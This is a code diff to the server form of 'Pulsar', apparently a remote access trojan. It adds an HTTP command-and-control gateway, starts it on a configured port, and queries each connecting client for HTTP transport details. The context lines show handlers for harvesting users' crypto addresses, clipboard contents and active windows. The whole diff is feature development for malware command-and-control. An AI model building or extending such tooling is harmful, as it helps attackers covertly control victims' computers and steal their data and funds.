@@ -7,6 +7,7 @@ using Pulsar.Common.Messages.ClientManagement.UAC;
 using Pulsar.Common.Messages.ClientManagement.WinRE;
 using Pulsar.Common.Messages.FunStuff;
 using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
+using Pulsar.Common.Messages.Monitoring;
 using Pulsar.Common.Messages.Preview;
 using Pulsar.Common.Messages.QuickCommands;
 using Pulsar.Common.Messages.UserSupport.MessageBox;
@@ -63,6 +64,8 @@ namespace Pulsar.Server.Forms
         [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
         public PulsarServer ListenServer { get; set; }
 
+        private HttpC2Gateway _httpC2Gateway;
+
         private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC
 
         private const int STATUS_ID = 5;
@@ -76,6 +79,7 @@ namespace Pulsar.Server.Forms
         private readonly ClientDebugLog _clientDebugLogHandler;
         private readonly DeferredAssemblyHandler _deferredAssemblyHandler = new DeferredAssemblyHandler();
         private readonly UniversalPluginResponseHandler _universalPluginResponseHandler = new UniversalPluginResponseHandler();
+        private readonly HttpTransportInfoHandler _httpTransportInfoHandler = new HttpTransportInfoHandler();
         private readonly BlockingCollection<KeyValuePair<Client, bool>> _clientConnections = new(new ConcurrentQueue<KeyValuePair<Client, bool>>());
         private readonly object _clientConnectionsStartLock = new object();
         private Task _clientConnectionsConsumerTask;
@@ -197,6 +201,7 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
             _clientStatusHandler.UserClipboardStatusUpdated += SetUserClipboardByClient;
+            MessageHandler.Register(_httpTransportInfoHandler);
             MessageHandler.Register(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
             MessageHandler.Register(_deferredAssemblyHandler);
@@ -212,6 +217,7 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
             _clientStatusHandler.UserClipboardStatusUpdated -= SetUserClipboardByClient;
+            MessageHandler.Unregister(_httpTransportInfoHandler);
             MessageHandler.Unregister(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
             MessageHandler.Unregister(_deferredAssemblyHandler);
@@ -273,6 +279,12 @@ namespace Pulsar.Server.Forms
         {
             try
             {
+                if (Settings.HttpC2Enabled)
+                {
+                    _httpC2Gateway ??= new HttpC2Gateway(ListenServer, Settings.HttpC2Port);
+                    _httpC2Gateway.Start();
+                }
+
                 var allPorts = new List<ushort> { Settings.ListenPort };
                 if (Settings.ListenPorts != null)
                     allPorts.AddRange(Settings.ListenPorts);
@@ -451,6 +463,9 @@ namespace Pulsar.Server.Forms
             {
                 SaveNotificationHistory();
                 SaveAutoTasks();
+
+                _httpC2Gateway?.Dispose();
+                _httpC2Gateway = null;
 
                 if (ListenServer != null)
                     ListenServer.Disconnect();
@@ -769,7 +784,11 @@ namespace Pulsar.Server.Forms
                 OfflineClientRepository.UpsertClient(client);
                 ScheduleOfflineListRefresh();
                 ScheduleStatsRefresh();
-                if (!ListenServer.Listening) return;
+                if (!ListenServer.Listening)
+                {
+                    return;
+                }
+
                 _clientConnections.Add(new KeyValuePair<Client, bool>(client, true));
 
                 lock (_clientConnectionsStartLock)
@@ -781,7 +800,10 @@ namespace Pulsar.Server.Forms
                         _clientConnectionsConsumerTask = Task.Run(() => ProcessClientConnectionsLoop(_clientConnectionsCts.Token));
                     }
                 }
+
                 UpdateConnectedClientsCount();
+
+                client.Send(new HttpTransportInfoRequest());
 
                 // Load plugins for the new client
                 LoadPluginsForClient(client);
